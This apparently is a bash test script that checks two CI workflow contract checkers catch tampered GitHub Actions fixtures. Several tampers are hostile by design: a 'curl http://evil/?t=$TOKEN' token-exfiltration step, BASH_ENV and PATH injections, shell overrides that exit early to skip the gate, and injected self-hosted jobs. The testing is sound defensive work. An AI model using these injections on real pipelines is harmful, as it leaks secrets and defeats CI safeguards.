#!/usr/bin/env bash
#
# Negative-control tests for the packaged-gate contract suite — proves both
# checkers CATCH a silently-dropped gate, not just that they PASS on the
# shipped fixtures (PR#595 parity). Runs against the REAL-YAML-parser
# checkers:
#   tools/check-packaged-gate-contract.sh         (execution workflow)
#   tools/check-packaged-gate-trust-anchor.sh     (trust anchor)
#
# Each tamper mutates a throwaway copy of the relevant fixture and asserts
# the checker fails for the INTENDED reason.
set -euo pipefail
CONTRACT="$(dirname "$0")/../check-packaged-gate-contract.sh"
ANCHOR_CONTRACT="$(dirname "$0")/../check-packaged-gate-trust-anchor.sh"
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
WF="${PACKAGED_GATE_WF:-$REPO_ROOT/tools/test/fixtures/packaged-user-gate.yml}"
ANCHOR_WF="$REPO_ROOT/tools/test/fixtures/packaged-gate-trust-anchor.yml"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

expect_violation() {
  local desc="$1"
  local expect_msg="$2"
  local checker="$3"
  local out
  out="$("$checker" "$WORK/tampered.yml" 2>&1 || true)"
  if [ -z "$out" ]; then
    echo "NEGATIVE CONTROL FAILED: contract passed where it must fail: $desc" >&2
    exit 1
  fi
  if ! printf '%s\n' "$out" | grep -qF "$expect_msg"; then
    echo "NEGATIVE CONTROL FAILED: contract failed for the WRONG reason on: $desc" >&2
    echo "  expected message: $expect_msg" >&2
    echo "  got: $out" >&2
    exit 1
  fi
  echo "caught ($expect_msg): $desc"
}

# Baseline: both shipped fixtures must PASS their checkers.
"$CONTRACT" "$WF" >/dev/null || {
  echo "NEGATIVE CONTROL FAILED: shipped execution fixture violates the contract" >&2
  exit 1
}
"$ANCHOR_CONTRACT" "$ANCHOR_WF" >/dev/null || {
  echo "NEGATIVE CONTROL FAILED: shipped trust-anchor fixture violates its contract" >&2
  exit 1
}
echo "baseline: both shipped fixtures pass"

# ── EXECUTION WORKFLOW — lane / invocation tamper classes ────────────────────
# Tamper 1: remove the lane invocation from the PR-fast job.
sed 's|bash e2e/run-critical-loop.sh|# (lane removed)|' "$WF" >"$WORK/tampered.yml"
expect_violation "PR-fast lane removed" "pr-fast lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 2: skip-green on the lane step (literal) — a STEP-level key.
sed '/^      - name: Packaged PR-fast lane/a\        continue-on-error: true' "$WF" >"$WORK/tampered.yml"
expect_violation "continue-on-error (literal true) added" "continue-on-error found (skip-green)" "$CONTRACT"

# Tamper 3: skip-green via expression.
sed '/^      - name: Packaged PR-fast lane/a\        continue-on-error: ${{ true }}' "$WF" >"$WORK/tampered.yml"
expect_violation "continue-on-error (expression) added" "continue-on-error found (skip-green)" "$CONTRACT"

# Tamper 4: path-filter the pull_request trigger.
sed 's|^  pull_request:$|  pull_request:\n    paths: ["src/**"]|' "$WF" >"$WORK/tampered.yml"
expect_violation "pull_request path filter added" "pull_request is path-filtered" "$CONTRACT"

# Tamper 5: make the PR-fast job conditionally skipped.
sed "s|^    if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository$|    if: \${{ false }}|" "$WF" >"$WORK/tampered.yml"
expect_violation "pr-fast job-level if: falsified" "pr-fast job-level if: is not the PR trigger + same-repo guard" "$CONTRACT"

# Tamper 6: drop a lane from the serial matrix (via the path override).
cp "$WF" "$WORK/tampered.yml"
sed 's|^run_lane reader|# run_lane reader|' "$REPO_ROOT/scripts/e2e-matrix.sh" >"$WORK/matrix-tampered.sh"
PACKAGED_GATE_MATRIX="$WORK/matrix-tampered.sh" expect_violation "matrix lane dropped" "matrix does not include the reader lane" "$CONTRACT"

# Tamper 7: shell-comment the lane invocation inside a run block.
sed 's@^        run: bash e2e/run-critical-loop.sh$@        run: |\n          # bash e2e/run-critical-loop.sh (disabled)@' "$WF" >"$WORK/tampered.yml"
expect_violation "lane invocation shell-commented" "pr-fast lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 8: inline-comment no-op carrying the invocation substring.
sed 's@^        run: bash e2e/run-critical-loop.sh$@        run: |\n          : # bash e2e/run-critical-loop.sh@' "$WF" >"$WORK/tampered.yml"
expect_violation "lane invocation reduced to inline-comment no-op" "pr-fast lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 9: colon no-op taking the invocation as its argument.
sed 's@^        run: bash e2e/run-critical-loop.sh$@        run: |\n          : bash e2e/run-critical-loop.sh@' "$WF" >"$WORK/tampered.yml"
expect_violation "lane invocation reduced to colon no-op" "pr-fast lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 10: falsify the real-corpus job condition.
sed "s|^    if: github.event_name == 'workflow_dispatch'$|    if: \${{ false }}|" "$WF" >"$WORK/tampered.yml"
expect_violation "real-corpus job condition falsified" "real-corpus job-level if: is not exactly the workflow_dispatch trigger" "$CONTRACT"

# Tamper 11: remove the corpus evidence upload's always-run guard.
cp "$WF" "$WORK/tampered.yml"
sed 's|if: always()|if: success()|' "$WORK/tampered.yml" >"$WORK/tampered2.yml" && mv "$WORK/tampered2.yml" "$WORK/tampered.yml"
expect_violation "real-corpus upload loses always()" "real-corpus evidence upload is not if: always()" "$CONTRACT"

# Tamper 12: colon no-op on the corpus invocation.
sed 's@^        run: LECTRICE_CORPUS_OUT="[^"]*" bash scripts/e2e-real-corpus.sh$@        run: |\n          LECTRICE_CORPUS_OUT="$RUNNER_TEMP/lectrice-corpus" : bash scripts/e2e-real-corpus.sh@' "$WF" >"$WORK/tampered.yml"
expect_violation "real-corpus invocation reduced to colon no-op" "real-corpus lane step run is not the exact canonical command" "$CONTRACT"

# ── EXECUTION WORKFLOW — job-set / condition tamper classes ──────────────────
# Tamper 13: same-repo guard removed from pr-fast.
sed "s| && github.event.pull_request.head.repo.full_name == github.repository$||" "$WF" >"$WORK/tampered.yml"
expect_violation "pr-fast same-repo guard removed" "pr-fast job-level if: is not the PR trigger + same-repo guard" "$CONTRACT"

# Tamper 16: the prerequisite-receipt enforcement step is removed.
sed '/Prerequisite receipt enforced/,+3d' "$WF" >"$WORK/tampered.yml"
expect_violation "receipt enforcement step removed" "lacks the prerequisite-receipt enforcement step" "$CONTRACT"

# Tamper 18: concurrency group back to per-ref.
sed 's|^  group: packaged-user-gate$|  group: packaged-user-gate-${{ github.ref }}|' "$WF" >"$WORK/tampered.yml"
expect_violation "concurrency group per-ref reintroduced" "concurrency group is not the fixed runner-wide packaged-user-gate" "$CONTRACT"

# Tamper 19: full-matrix allowed to run on pull_request.
sed "s|^    if: github.event_name != 'pull_request'$|    if: github.event_name == 'pull_request'|" "$WF" >"$WORK/tampered.yml"
expect_violation "unguarded job can run on pull_request" "full-matrix job-level if: is not the exact canonical condition" "$CONTRACT"

# Tamper 21: the enforcement step body stops testing the receipt.
sed 's|\[ -f ci-evidence/prerequisite-failure.json \]|true|' "$WF" >"$WORK/tampered.yml"
expect_violation "enforcement step body vacuous" "enforcement step does not test the receipt's presence" "$CONTRACT"

# Tamper 24: the lane invocation moved into an env value with a no-op run.
sed -e 's|^        run: bash e2e/run-critical-loop.sh$|        run: true|' \
    -e 's|^      - name: Packaged PR-fast lane|      - name: Packaged PR-fast lane\n        env:\n          BURY: bash e2e/run-critical-loop.sh|' \
    "$WF" >"$WORK/tampered.yml"
expect_violation "lane invocation buried in an env value" "step-level env is not permitted" "$CONTRACT"

# Tamper 25: pr-fast loses its job-level if entirely.
sed '/^    if: github.event_name == '\''pull_request'\'' && github.event.pull_request.head.repo.full_name == github.repository$/d' "$WF" >"$WORK/tampered.yml"
expect_violation "pr-fast job-level if deleted" "pr-fast job-level if: is not the PR trigger + same-repo guard" "$CONTRACT"

# Tamper 26: full-matrix loses its job-level if.
sed '/^    if: github.event_name != '\''pull_request'\''$/d' "$WF" >"$WORK/tampered.yml"
expect_violation "full-matrix job-level if deleted" "full-matrix job has no job-level if" "$CONTRACT"

# Tamper 29: full-matrix if replaced with false.
sed "s|^    if: github.event_name != 'pull_request'$|    if: \${{ false }}|" "$WF" >"$WORK/tampered.yml"
expect_violation "full-matrix if falsified" "full-matrix job-level if: is not the exact canonical condition" "$CONTRACT"

# Tamper 30: full-matrix if deleted (deletion NC for the exact-condition rule).
sed '/^    if: github.event_name != '\''pull_request'\''$/d' "$WF" >"$WORK/tampered.yml"
expect_violation "full-matrix job-level if deleted (exact)" "full-matrix job has no job-level if" "$CONTRACT"

# Tamper 31: an uppercase job ID injected (closed job set).
sed 's|^jobs:$|jobs:\n  EVIL_JOB:\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "uppercase unguarded job injected" "unexpected self-hosted job set" "$CONTRACT"

# Tamper 33: a condition-gamed new job.
sed 's|^jobs:$|jobs:\n  EVIL_JOB:\n    if: github.event_name != '\''pull_request'\'' \|\| github.event_name == '\''pull_request'\''\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "condition-gamed job injected" "unexpected self-hosted job set" "$CONTRACT"

# Tamper 36: quoted job ID injected.
sed 's|^jobs:$|jobs:\n  "EVIL_JOB":\n    if: github.event_name == '\''pull_request'\''\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "quoted job ID injected" "unexpected self-hosted job set" "$CONTRACT"

# Tamper 37: single-quoted job ID injected.
sed 's|^jobs:$|jobs:\n  '\''EVIL_JOB'\'':\n    if: github.event_name == '\''pull_request'\''\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "single-quoted job ID injected" "unexpected self-hosted job set" "$CONTRACT"

# Tamper 38: whitespace before the colon in a job key.
sed 's|^jobs:$|jobs:\n  EVIL_JOB :\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "whitespace-colon job key injected" "unexpected self-hosted job set" "$CONTRACT"

# Tamper 39: unquoted job key with a trailing YAML comment.
sed 's|^jobs:$|jobs:\n  EVIL_JOB: # comment\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "trailing-comment job key injected" "unexpected self-hosted job set" "$CONTRACT"

# Tamper 40: quoted job key with a trailing YAML comment.
sed 's|^jobs:$|jobs:\n  "EVIL_JOB": # comment\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo exposed|' "$WF" >"$WORK/tampered.yml"
expect_violation "quoted trailing-comment job key injected" "unexpected self-hosted job set" "$CONTRACT"

# ── EXECUTION WORKFLOW — mutable action ref classes (all YAML spellings
#    normalize to the same parsed value — the parser is the fix) ─────────────
# Tamper 14: mutable action ref reintroduced.
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "mutable action ref reintroduced" "mutable action ref found" "$CONTRACT"

# Tamper 23: quoted mutable action ref.
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: "actions/checkout@v4"|' "$WF" >"$WORK/tampered.yml"
expect_violation "quoted mutable action ref" "mutable action ref found" "$CONTRACT"

# Tamper 32: single-quoted mutable action ref.
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: '\''actions/checkout@v4'\''|' "$WF" >"$WORK/tampered.yml"
expect_violation "single-quoted mutable action ref" "mutable action ref found" "$CONTRACT"

# Tamper 35: mutable ref with a trailing YAML comment.
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: actions/checkout@v4 # mutable|' "$WF" >"$WORK/tampered.yml"
expect_violation "mutable action ref with trailing comment" "mutable action ref found" "$CONTRACT"

# Tamper 41: local action (no-@ form).
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: ./scripts/local-action|' "$WF" >"$WORK/tampered.yml"
expect_violation "local action ref" "mutable action ref found" "$CONTRACT"

# Tamper 42: docker action (no-@ form).
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: docker://alpine:latest|' "$WF" >"$WORK/tampered.yml"
expect_violation "docker action ref" "mutable action ref found" "$CONTRACT"

# Tamper 44: quoted-key flow form with a mutable value.
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - "uses": actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "quoted-key flow form with mutable value" "mutable action ref found" "$CONTRACT"

# Tamper 46: YAML-escaped uses key spelling.
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - "\\u0075ses": actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "escaped uses key spelling" "mutable action ref found" "$CONTRACT"

# Tamper 47: bare uses key with whitespace before the colon.
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses : actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "whitespace-colon bare uses key" "mutable action ref found" "$CONTRACT"

# Tamper 48: quoted uses key with whitespace before the colon.
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - "uses" : actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "whitespace-colon quoted uses key" "mutable action ref found" "$CONTRACT"

# Tamper 49: flow mapping form.
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - { uses: actions/checkout@v4 }|' "$WF" >"$WORK/tampered.yml"
expect_violation "flow mapping uses" "mutable action ref found" "$CONTRACT"

# Tamper 50: quoted-key flow mapping form.
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - { "uses": actions/checkout@v4 }|' "$WF" >"$WORK/tampered.yml"
expect_violation "quoted-key flow mapping uses" "mutable action ref found" "$CONTRACT"

# Tamper 51: explicit-key form.
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - ? uses\n        : actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "explicit-key uses" "mutable action ref found" "$CONTRACT"

# Tamper 52: block-scalar explicit key (folded >-).
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - ? >-\n          uses\n        : actions/checkout@v4|' "$WF" >"$WORK/tampered.yml"
expect_violation "block-scalar explicit key (>-)" "mutable action ref found" "$CONTRACT"

# Tamper 53: block-scalar explicit key (literal |-).
sed 's;^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$;      - ? |-\n          uses\n        : actions/checkout@v4;' "$WF" >"$WORK/tampered.yml"
expect_violation "block-scalar explicit key (|-)" "mutable action ref found" "$CONTRACT"

# Tamper 54: anchors/aliases present (M1 presence rejection).
sed 's|^      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262$|      - uses: \&mutable actions/checkout@v4\n      - uses: *mutable|' "$WF" >"$WORK/tampered.yml"
expect_violation "anchor/alias mutable ref" "YAML anchors/aliases/merge keys are not permitted" "$CONTRACT"

# Tamper 55: multi-document workflow (fail-closed).
cp "$WF" "$WORK/tampered.yml"
printf '\n---\nother: 1\n' >>"$WORK/tampered.yml"
expect_violation "multi-document workflow" "expected exactly one YAML document" "$CONTRACT"

# Tamper 56: step-level if: false on the PR-fast lane step.
sed '/^      - name: Packaged PR-fast lane/a\        if: false' "$WF" >"$WORK/tampered.yml"
expect_violation "step-level if: false on the lane step" "step-level if: not permitted" "$CONTRACT"

# Tamper 57: step-level if: false on the driver assertion.
sed '/^      - name: Assert tauri-driver inside the PINNED flake devShell/a\        if: false' "$WF" >"$WORK/tampered.yml"
expect_violation "step-level if: false on the driver assertion" "step-level if: not permitted" "$CONTRACT"

# Tamper 59: merge key present (M1 presence rejection).
sed 's|^jobs:$|jobs:\n  <<: &merge_jobs {}\n  |' "$WF" >"$WORK/tampered.yml"
expect_violation "merge key present" "YAML anchors/aliases/merge keys are not permitted" "$CONTRACT"

# Tamper 60: runs-on widened away from the exact vm103 label set.
sed 's|runs-on: \[self-hosted, Linux, X64, vm103\]|runs-on: [self-hosted, Linux, X64]|' "$WF" >"$WORK/tampered.yml"
expect_violation "runs-on widened to self-hosted" "runs-on is not the exact vm103 label set" "$CONTRACT"

# Tamper 61: permissions widened to contents: write.
sed 's|^permissions:$|permissions:\n  contents: write|; /^  contents: read$/d' "$WF" >"$WORK/tampered.yml"
expect_violation "permissions widened to contents: write" "permissions must be exactly contents: read" "$CONTRACT"

# Tamper 62: lane run gains a `|| true` operator (skip-green suffix).
sed 's@bash e2e/run-critical-loop.sh$@bash e2e/run-critical-loop.sh || true@' "$WF" >"$WORK/tampered.yml"
expect_violation "lane run with || true suffix" "pr-fast lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 63: job-level continue-on-error on pr-fast.
sed '/^  pr-fast:$/a\    continue-on-error: true' "$WF" >"$WORK/tampered.yml"
expect_violation "job-level continue-on-error" "continue-on-error found (skip-green)" "$CONTRACT"

# Tamper 64: job-local permissions block overrides the global.
sed '/^  pr-fast:$/a\    permissions:\n      contents: write' "$WF" >"$WORK/tampered.yml"
expect_violation "job-level permissions block" "job-level permissions are not permitted" "$CONTRACT"

# Tamper 65: multi-command pr-fast lane run (set +e; …; true).
sed 's@^        run: bash e2e/run-critical-loop.sh$@        run: |\n          set +e\n          bash e2e/run-critical-loop.sh\n          true@' "$WF" >"$WORK/tampered.yml"
expect_violation "multi-command pr-fast lane run" "pr-fast lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 66: multi-command full-matrix lane run.
sed 's@^        run: bash scripts/e2e-matrix.sh$@        run: |\n          set +e\n          bash scripts/e2e-matrix.sh\n          true@' "$WF" >"$WORK/tampered.yml"
expect_violation "multi-command full-matrix lane run" "full-matrix lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 67: multi-command real-corpus lane run.
sed 's@^        run: LECTRICE_CORPUS_OUT="\$RUNNER_TEMP/lectrice-corpus" bash scripts/e2e-real-corpus.sh$@        run: |\n          set +e\n          LECTRICE_CORPUS_OUT="$RUNNER_TEMP/lectrice-corpus" bash scripts/e2e-real-corpus.sh\n          true@' "$WF" >"$WORK/tampered.yml"
expect_violation "multi-command real-corpus lane run" "real-corpus lane step run is not the exact canonical command" "$CONTRACT"

# Tamper 68: shell override on the pr-fast lane step.
sed '/^      - name: Packaged PR-fast lane/a\        shell: bash' "$WF" >"$WORK/tampered.yml"
expect_violation "lane step shell override" "lane step shell override is not permitted" "$CONTRACT"

# Tamper 69: workflow-level defaults.run.shell override.
sed 's|^permissions:$|defaults:\n  run:\n    shell: bash -c '"'"'exit 0'"'"' {0}\npermissions:|' "$WF" >"$WORK/tampered.yml"
expect_violation "workflow-level defaults.run.shell" "workflow-level defaults are not permitted" "$CONTRACT"

# Tamper 70: job-level defaults.run.shell on pr-fast.
sed '/^  pr-fast:$/a\    defaults:\n      run:\n        shell: bash -c '"'"'exit 0'"'"' {0}' "$WF" >"$WORK/tampered.yml"
expect_violation "job-level defaults.run.shell" "job-level defaults are not permitted" "$CONTRACT"

# Tamper 71: workflow env gains BASH_ENV.
sed 's|^env:$|env:\n  BASH_ENV: /tmp/evil|' "$WF" >"$WORK/tampered.yml"
expect_violation "workflow env BASH_ENV injection" "workflow env is not the exact pinned map" "$CONTRACT"

# Tamper 72: job-level env on pr-fast.
sed '/^  pr-fast:$/a\    env:\n      BASH_ENV: /tmp/evil' "$WF" >"$WORK/tampered.yml"
expect_violation "job-level env BASH_ENV injection" "job-level env is not permitted" "$CONTRACT"

# Tamper 73: lane-step env with BASH_ENV.
sed '/^      - name: Packaged PR-fast lane/a\        env:\n          BASH_ENV: /tmp/evil' "$WF" >"$WORK/tampered.yml"
expect_violation "lane-step env BASH_ENV injection" "step-level env is not permitted" "$CONTRACT"

# Tamper 74: env on an ordinary execution step (no allowlist exists here).
sed '/^      - name: Install dependencies/a\        env:\n          PATH: /tmp/evil' "$WF" >"$WORK/tampered.yml"
expect_violation "env on ordinary execution step" "step-level env is not permitted" "$CONTRACT"

# Tamper 75: extra step injected into pr-fast (deep-equality class).
sed '/run: pnpm install --frozen-lockfile/a\      - name: exfil step\n        run: curl http://evil/?t=$TOKEN' "$WF" >"$WORK/tampered.yml"
expect_violation "extra execution step" "candidate workflow is not deep-structural-equal" "$CONTRACT"

# Tamper 76: modified run on an ordinary step (deep-equality class).
sed 's|pnpm install --frozen-lockfile|pnpm install --frozen-lockfile\n          curl http://evil/?t=$TOKEN|' "$WF" >"$WORK/tampered.yml"
expect_violation "modified ordinary run" "candidate workflow is not deep-structural-equal" "$CONTRACT"

# Tamper 77: arbitrary nested key inside a job.
sed '/^  pr-fast:$/a\    invisible-key: true' "$WF" >"$WORK/tampered.yml"
expect_violation "arbitrary nested key" "candidate workflow is not deep-structural-equal" "$CONTRACT"

# ── TRUST ANCHOR — tamper classes ────────────────────────────────────────────
# Tamper A1: an extra trigger added.
sed 's|^  pull_request_target:$|  pull_request_target:\n  pull_request:|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor extra trigger" "the trust anchor must trigger on pull_request_target ONLY" "$ANCHOR_CONTRACT"

# Tamper A2: a second job added.
sed 's|^jobs:$|jobs:\n  evil:\n    runs-on: [self-hosted, Linux, X64, vm103]\n    steps:\n      - run: echo x|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor second job" "the trust anchor must have exactly one job" "$ANCHOR_CONTRACT"

# Tamper A3: same-repo guard removed from the anchor job.
sed "s|^    if: github.event.pull_request.head.repo.full_name == github.repository$|    if: github.event_name == 'pull_request'|" "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor same-repo guard removed" "contract job if: is not the exact same-repo guard" "$ANCHOR_CONTRACT"

# Tamper A4: checkout pinned to the head instead of the base.
sed 's|pull_request.base.sha|pull_request.head.sha|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor checkout at head" "anchor checkout must be pinned to pull_request.base.sha" "$ANCHOR_CONTRACT"

# Tamper A5: the head file fetched via git instead of the API.
sed 's|gh api "repos/|git fetch origin $HEAD_SHA # |' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor git fetch of head" "head file must be fetched via gh api" "$ANCHOR_CONTRACT"

# Tamper A6: event-payload head sha shell-interpolated.
sed 's|ref=$HEAD_SHA|ref=${{ github.event.pull_request.head.sha }}|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor head sha shell interpolation" "event-payload head sha must never be shell-interpolated" "$ANCHOR_CONTRACT"

# Tamper A7: anchor permissions widened.
sed 's|^  contents: read$|  contents: write|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor permissions widened" "permissions must be exactly contents: read" "$ANCHOR_CONTRACT"

# Tamper A8: anchor concurrency per-ref.
sed 's|^  group: packaged-gate-trust-anchor$|  group: packaged-gate-trust-anchor-${{ github.ref }}|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor concurrency per-ref" "concurrency group is not the fixed packaged-gate-trust-anchor" "$ANCHOR_CONTRACT"

# Tamper A9: arbitrary nested key in the anchor.
sed '/^  contract:$/a\    invisible-key: true' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor arbitrary nested key" "candidate anchor is not deep-structural-equal" "$ANCHOR_CONTRACT"

# Tamper A10: mutable action ref in the anchor.
sed 's|uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262|uses: actions/checkout@v4|' "$ANCHOR_WF" >"$WORK/tampered.yml"
expect_violation "anchor mutable action ref" "mutable action ref found" "$ANCHOR_CONTRACT"

echo "NEGATIVE CONTROL PASS: contract catches all violation classes, each for the intended reasons"
